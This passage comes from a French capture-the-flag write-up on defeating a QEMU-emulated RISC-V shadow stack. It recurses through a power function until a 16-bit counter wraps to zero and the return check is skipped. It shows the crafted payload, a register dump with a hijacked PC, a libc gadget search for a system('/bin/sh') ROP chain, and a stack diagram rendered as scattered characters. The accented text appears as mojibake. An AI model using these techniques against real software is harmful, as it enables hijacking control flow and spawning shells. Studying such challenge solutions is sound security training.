</span></span><span class="line"><span class="cl">  <span class="n">results</span><span class="p">[</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">id</span><span class="p">]</span> <span class="o">*=</span> <span class="nf">get_value</span><span class="p">(</span><span class="n">node_l</span><span class="p">,</span> <span class="n">results</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">handle_power</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">results</span><span class="p">,</span> <span class="o">--</span><span class="n">power</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">error_kind</span> <span class="nf">do_power</span> <span class="p">(</span><span class="kt">node_t</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="kt">int64_t</span> <span class="n">results</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">IN_SHADOW</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kt">node_t</span> <span class="o">*</span><span class="n">node_l</span> <span class="o">=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">node_l</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">node_t</span> <span class="o">*</span><span class="n">node_r</span> <span class="o">=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">node_r</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int64_t</span> <span class="n">power</span> <span class="o">=</span> <span class="nf">get_value</span><span class="p">(</span><span class="n">node_r</span><span class="p">,</span> <span class="n">results</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">power</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ERROR_POWER_NEGATIVE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">power</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">results</span><span class="p">[</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ERROR_NO_ERROR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">results</span><span class="p">[</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="nf">get_value</span><span class="p">(</span><span class="n">node_l</span><span class="p">,</span> <span class="n">results</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">handle_power</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">results</span><span class="p">,</span> <span class="o">--</span><span class="n">power</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">ERROR_NO_ERROR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>L&rsquo;int√©r√™t d&rsquo;exploiter cette fonction est que si l&rsquo;on parvient √† faire revenir dark_offset √† 0, dans ce cas pr√©cis, le check dans le patch de l&rsquo;instruction jalr n&rsquo;est pas effectu√©:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">+</span>        <span class="n">TCGv</span> <span class="n">dark_offset</span> <span class="o">=</span> <span class="nf">tcg_temp_new</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="n">TCGv_i32</span> <span class="n">csr_darkoff</span> <span class="o">=</span> <span class="nf">tcg_constant_i32</span><span class="p">(</span><span class="n">CSR_DARKOFF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nf">gen_helper_csrr</span><span class="p">(</span><span class="n">dark_offset</span><span class="p">,</span> <span class="n">cpu_env</span><span class="p">,</span> <span class="n">csr_darkoff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nf">tcg_gen_brcondi_tl</span><span class="p">(</span><span class="n">TCG_COND_EQ</span><span class="p">,</span> <span class="n">dark_offset</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">shadow_pact_end</span><span class="p">);</span>
</span></span></code></pre></div><p>Et une fois que le compteur est √† 0, le programme va retourner de tous les appels √† handle_power, puis de dispatch, puis de calc, puis sur notre exploit sans faire de check sur la shadow stack. Il faut donc faire assez d&rsquo;appels pour que le compteur dark_offest revienne √† 0.</p>
<p>Au moment o√π la fonction <code>handle_power</code> est appell√©e pour la premi√®re fois, la dark_page comporte 4 entr√©es, respectivement l&rsquo;adresse de retour de <code>secure_calc</code>, <code>calc</code>, <code>dispatch</code>, <code>do_power</code> ce qui implique que dark_offset vaut 4 * 8 = 32 √† ce moment l√†.</p>
<p>Sachant que dark_offset est incr√©ment√© de 8 √† chaque appel et qu&rsquo;il peut repr√©senter au maximum 2**16 - 1,
si on veut que le compteur revienne √† 0 il nous suffit de faire en sorte que handle_power s&rsquo;appelle r√©cursivement au moins (65536 - 32) / 8 fois = 8188 fois.</p>
<p>Je pr√©cise &ldquo;au moins&rdquo; car si on l&rsquo;appelle plus que ca, la technique fonctionne aussi.Une fois que 0 est atteint les appels suivants vont s&rsquo;annuler jusqu&rsquo;√† retomber √† 0 MAIS le compteur ne redescendra pas en dessous de 0 car dans le patch de l&rsquo;instruction jalr, si le compteur dark_offset vaut 0, le check sur la shadow stack n&rsquo;est pas fait et en plus le compteur n&rsquo;est pas d√©cr√©ment√©.</p>
<p>Et pour ajouter des appels r√©cursifs √† notre payload, il suffit de le &ldquo;wrapper&rdquo; dans une node qui se chargera de faire les calculs de puissance:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">((1*1)(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0)))))))))))))))))+4702111234474983745))**8188
</span></span></code></pre></div><p>On teste et:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">RA</span>   <span class="mh">0x4141414141414141</span> <span class="p">(</span><span class="err">&#39;</span><span class="n">AAAAAAAA</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">GP</span>   <span class="mh">0x16800</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">TP</span>   <span class="mh">0x4000953da0</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x4000945228</span> <span class="p">(</span><span class="n">_nl_global_locale</span><span class="p">)</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x4000941dd0</span> <span class="p">(</span><span class="n">_nl_C_LC_CTYPE</span><span class="p">)</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x400092bde8</span> <span class="p">(</span><span class="n">_nl_C_name</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x43</span> <span class="cm">/* &#39;C&#39; */</span>                                                                        
</span></span><span class="line"><span class="cl"> <span class="n">T0</span>   <span class="mh">0x400081e290</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">T1</span>   <span class="mh">0x17470</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x17</span>
</span></span><span class="line"><span class="cl"> <span class="n">T2</span>   <span class="mh">0x3</span>
</span></span><span class="line"><span class="cl"> <span class="n">S0</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S1</span>   <span class="mh">0x1</span>
</span></span><span class="line"><span class="cl"> <span class="n">A0</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">A1</span>   <span class="mh">0x4000800348</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x101010101</span>
</span></span><span class="line"><span class="cl"> <span class="n">A2</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">A3</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">A4</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">A5</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">A6</span>   <span class="mh">0x174e0</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x17</span>
</span></span><span class="line"><span class="cl"> <span class="n">A7</span>   <span class="mh">0x29ea5ca3aef8c772</span>
</span></span><span class="line"><span class="cl"> <span class="n">S2</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S3</span>   <span class="mh">0x15e00</span> <span class="p">(</span><span class="n">__do_global_dtors_aux_fini_array_entry</span><span class="p">)</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x10f24</span> <span class="p">(</span><span class="n">__do_global_dtors_aux</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="n">c</span><span class="p">.</span><span class="n">addi</span> <span class="n">sp</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x10</span>                                                                                                 
</span></span><span class="line"><span class="cl"> <span class="n">S4</span>   <span class="mh">0x14260</span> <span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="n">c</span><span class="p">.</span><span class="n">addi16sp</span> <span class="n">sp</span><span class="p">,</span> <span class="o">-</span><span class="mh">0xd0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S5</span>   <span class="mh">0x4000800688</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x4000800858</span> <span class="err">‚óÇ‚Äî</span> <span class="err">&#39;</span><span class="n">_</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">challenger</span><span class="o">/</span><span class="n">qemu</span><span class="o">/</span><span class="n">build</span><span class="o">/</span><span class="n">qemu</span><span class="o">-</span><span class="n">riscv64</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"> <span class="n">S6</span>   <span class="mh">0x15e00</span> <span class="p">(</span><span class="n">__do_global_dtors_aux_fini_array_entry</span><span class="p">)</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x10f24</span> <span class="p">(</span><span class="n">__do_global_dtors_aux</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="n">c</span><span class="p">.</span><span class="n">addi</span> <span class="n">sp</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x10</span>                                                                                                 
</span></span><span class="line"><span class="cl"> <span class="n">S7</span>   <span class="mh">0x400081cd78</span> <span class="p">(</span><span class="n">_rtld_local_ro</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S8</span>   <span class="mh">0x400081d030</span> <span class="p">(</span><span class="n">_rtld_local</span><span class="p">)</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x400081e290</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S9</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S10</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S11</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">T3</span>   <span class="mh">0x400089afc8</span> <span class="p">(</span><span class="n">free</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0xff8537837179c54d</span>
</span></span><span class="line"><span class="cl"> <span class="n">T4</span>   <span class="mh">0x76fc8</span>
</span></span><span class="line"><span class="cl"> <span class="n">T5</span>   <span class="mh">0x4000912950</span> <span class="p">(</span><span class="n">_nl_C_LC_CTYPE_toupper</span><span class="o">+</span><span class="mi">512</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x100000000</span>
</span></span><span class="line"><span class="cl"> <span class="n">T6</span>   <span class="mh">0x1f25bc2</span>
</span></span><span class="line"><span class="cl"> <span class="n">SP</span>   <span class="mh">0x40008003e0</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0xc3c3c3c3c3c38241</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">PC</span>   <span class="mh">0x4141414141414140</span> <span class="p">(</span><span class="err">&#39;@</span><span class="n">AAAAAAA</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span><span class="p">[</span> <span class="n">DISASM</span> <span class="o">/</span> <span class="n">rv64</span> <span class="o">/</span> <span class="n">set</span> <span class="n">emulate</span> <span class="n">on</span> <span class="p">]</span><span class="err">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">Invalid</span> <span class="n">address</span> <span class="mh">0x4141414141414140</span>
</span></span></code></pre></div><p>On a bien r√©ussi √† avoir une segmentation fault, on peut maintenant commencer √† chercher des gadgets pour faire un appel √† <code>system(&quot;/bin/sh&quot;)</code>. Pour faire un appel √† une fonction, l&rsquo;ABI RISC-V sp√©cifie que le premier param√®tre doit √™tre pass√© dans le registre A0. Id√©alement il nous faudrait trouver un gadget qui charge RA depuis la stack <code>ld ra, n(sp)</code>, load A0 depuis la stack <code>ld a0, n(sp)</code>et finisse par un <code>ret</code>. Bien que ROPGadget fonctionne avec les binaires RISC-V j&rsquo;ai pr√©f√©r√© chercher les gadgets manuellement avec <code>riscv64-unknown-linux-gnu-objdump</code> dans la libc √©tant donn√© que l&rsquo;ASLR est d√©sactiv√©. Pour cela j&rsquo;ai fait un grep un peu crade:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">riscv64-unknown-linux-gnu-objdump -axd /home/challenger/riscv/sysroot/lib/libc.so.6 | grep -P &#34;ld\s+ra&#34; -A5 -B5 | grep -P &#34;ld\s+a0&#34; -A5 -B5
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[...]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3ba86:       60e2                    ld      ra,24(sp)
</span></span><span class="line"><span class="cl">   3ba88:       6522                    ld      a0,8(sp)
</span></span><span class="line"><span class="cl">   3ba8a:       6105                    add     sp,sp,32
</span></span><span class="line"><span class="cl">   3ba8c:       8082                    ret
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[...]
</span></span></code></pre></div><p>Parfait! On r√©cup√®re l&rsquo;adresse de <code>system</code> et d&rsquo;une chaine de caract√®re &ldquo;/bin/sh&rdquo; dans la libc gr√¢ce √† gdb et on va pouvoir finaliser notre exploit. Voil√† √† quoi devrait ressembler la stack pour que l&rsquo;exploit fonctionne:</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 864 265"
      >
      <g transform='translate(8,16)'>
<path d='M 160,0 L 312,0' fill='none' stroke='currentColor'></path>
<path d='M 328,16 L 352,16' fill='none' stroke='currentColor'></path>
<path d='M 160,32 L 312,32' fill='none' stroke='currentColor'></path>
<path d='M 328,48 L 352,48' fill='none' stroke='currentColor'></path>
<path d='M 160,64 L 312,64' fill='none' stroke='currentColor'></path>
<path d='M 328,80 L 352,80' fill='none' stroke='currentColor'></path>
<path d='M 160,96 L 312,96' fill='none' stroke='currentColor'></path>
<path d='M 328,112 L 352,112' fill='none' stroke='currentColor'></path>
<path d='M 160,128 L 312,128' fill='none' stroke='currentColor'></path>
<path d='M 328,144 L 360,144' fill='none' stroke='currentColor'></path>
<path d='M 160,160 L 312,160' fill='none' stroke='currentColor'></path>
<path d='M 464,160 L 584,160' fill='none' stroke='currentColor'></path>
<path d='M 392,176 L 440,176' fill='none' stroke='currentColor'></path>
<path d='M 688,176 L 848,176' fill='none' stroke='currentColor'></path>
<path d='M 656,192 L 672,192' fill='none' stroke='currentColor'></path>
<path d='M 688,208 L 848,208' fill='none' stroke='currentColor'></path>
<path d='M 600,224 L 624,224' fill='none' stroke='currentColor'></path>
<path d='M 464,240 L 584,240' fill='none' stroke='currentColor'></path>
<path d='M 160,0 L 160,32' fill='none' stroke='currentColor'></path>
<path d='M 160,32 L 160,64' fill='none' stroke='currentColor'></path>
<path d='M 160,64 L 160,96' fill='none' stroke='currentColor'></path>
<path d='M 160,96 L 160,128' fill='none' stroke='currentColor'></path>
<path d='M 160,128 L 160,160' fill='none' stroke='currentColor'></path>
<path d='M 312,0 L 312,32' fill='none' stroke='currentColor'></path>
<path d='M 312,32 L 312,64' fill='none' stroke='currentColor'></path>
<path d='M 312,64 L 312,96' fill='none' stroke='currentColor'></path>
<path d='M 312,96 L 312,128' fill='none' stroke='currentColor'></path>
<path d='M 312,128 L 312,160' fill='none' stroke='currentColor'></path>
<path d='M 464,160 L 464,240' fill='none' stroke='currentColor'></path>
<path d='M 584,160 L 584,240' fill='none' stroke='currentColor'></path>
<path d='M 688,176 L 688,208' fill='none' stroke='currentColor'></path>
<path d='M 848,176 L 848,208' fill='none' stroke='currentColor'></path>
<polygon points='360.000000,16.000000 348.000000,10.400000 348.000000,21.600000' fill='currentColor' transform='rotate(0.000000, 352.000000, 16.000000)'></polygon>
<polygon points='360.000000,48.000000 348.000000,42.400002 348.000000,53.599998' fill='currentColor' transform='rotate(0.000000, 352.000000, 48.000000)'></polygon>
<polygon points='360.000000,80.000000 348.000000,74.400002 348.000000,85.599998' fill='currentColor' transform='rotate(0.000000, 352.000000, 80.000000)'></polygon>
<polygon points='360.000000,112.000000 348.000000,106.400002 348.000000,117.599998' fill='currentColor' transform='rotate(0.000000, 352.000000, 112.000000)'></polygon>
<polygon points='448.000000,176.000000 436.000000,170.399994 436.000000,181.600006' fill='currentColor' transform='rotate(0.000000, 440.000000, 176.000000)'></polygon>
<polygon points='680.000000,192.000000 668.000000,186.399994 668.000000,197.600006' fill='currentColor' transform='rotate(0.000000, 672.000000, 192.000000)'></polygon>
<path d='M 360,144 A 16,16 0 0,1 376,160' fill='none' stroke='currentColor'></path>
<path d='M 376,160 A 16,16 0 0,0 392,176' fill='none' stroke='currentColor'></path>
<path d='M 656,192 A 16,16 0 0,0 640,208' fill='none' stroke='currentColor'></path>
<path d='M 640,208 A 16,16 0 0,1 624,224' fill='none' stroke='currentColor'></path>
<text text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='0' y='52' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='0' y='84' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='0' y='116' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='0' y='148' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='8' y='52' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='8' y='84' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='8' y='116' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='8' y='148' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='16' y='52' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='16' y='84' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='16' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='16' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='24' y='52' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='24' y='84' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='24' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='24' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='40' y='52' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='40' y='84' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='40' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='40' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>¬∞</text>
<text text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'>¬∞</text>
<text text-anchor='middle' x='48' y='84' fill='currentColor' style='font-size:1em'>¬∞</text>
<text text-anchor='middle' x='48' y='116' fill='currentColor' style='font-size:1em'>¬∞</text>
<text text-anchor='middle' x='48' y='148' fill='currentColor' style='font-size:1em'>¬∞</text>
<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='56' y='52' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='56' y='84' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='56' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='56' y='148' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='64' y='52' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='64' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='64' y='116' fill='currentColor' style='font-size:1em'>9</text>
<text text-anchor='middle' x='64' y='148' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='96' y='52' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='96' y='84' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='96' y='148' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='104' y='52' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='104' y='84' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='104' y='148' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='120' y='52' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='120' y='84' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='120' y='148' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='128' y='116' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='136' y='84' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='136' y='116' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='136' y='148' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='192' y='52' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='192' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='192' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='192' y='148' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='200' y='52' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='200' y='84' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='200' y='148' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='208' y='52' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='208' y='84' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='208' y='148' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='216' y='52' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='216' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='216' y='116' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='216' y='148' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='224' y='52' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='224' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='232' y='52' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='232' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='232' y='116' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='232' y='148' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='240' y='52' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='240' y='84' fill='currentColor' style='font-size:1em'>9</text>
<text text-anchor='middle' x='240' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='240' y='148' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='248' y='52' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='248' y='84' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='248' y='148' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>9</text>
<text text-anchor='middle' x='256' y='52' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='256' y='84' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='256' y='148' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='264' y='52' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='264' y='84' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='264' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='272' y='52' fill='currentColor' style='font-size:1em'>2</text>
